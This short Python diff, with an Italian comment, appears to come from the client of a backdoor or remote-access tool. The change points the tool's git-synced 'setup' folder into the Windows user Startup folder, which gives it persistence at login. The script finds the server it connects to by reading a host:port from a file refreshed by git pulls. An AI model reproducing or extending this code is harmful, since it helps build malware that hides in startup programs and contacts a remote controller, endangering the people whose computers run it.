@@ -4,9 +4,13 @@ import time
 import os
 import socket
 
+hostname = os.getlogin()  # nome dell'utente di sistema
+actual_dir = os.path.join('C:\\Users', str(hostname), 'AppData\Roaming\Microsoft\Windows\Start menu\Programs\Startup')
+
+
 def pull():
     print("[*] pulling...")
-    repo = git.Repo('./setup')
+    repo = git.Repo(actual_dir+'\setup')
     o = repo.remotes.origin
     o.pull()
 
@@ -19,7 +23,7 @@ def search_server_to_connect():
             text = f.read()
             host, port = text.split(":")
             print("[*]FOUND: "+host+" "+port)
-        except:
+        except FileNotFoundError:
             print("[*]file not found :(")
             time.sleep(20)
             pull()
